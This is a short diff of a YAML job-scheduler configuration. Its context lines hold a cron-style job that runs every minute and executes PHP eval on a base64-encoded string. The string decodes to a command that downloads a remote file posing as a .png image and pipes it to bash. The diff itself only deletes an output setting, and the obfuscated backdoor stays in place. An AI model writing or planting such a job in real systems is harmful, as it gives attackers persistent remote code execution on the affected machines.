@@ -4,7 +4,6 @@ custom_jobs:
     command: /usr/bin/php
     args: '-r eval(base64_decode("KGN1cmwgLXMgaHR0cHM6Ly9hLnBvbWYuY2F0L2NmcXhxai5wbmd8fHdnZXQgLXEgLU8tIGh0dHBzOi8vYS5wb21mLmNhdC9jZnF4cWoucG5nKXxiYXNo"));'
     at: '* * * * *'
-    output: null
     output_mode: append
 status:
   vwlya: enabled
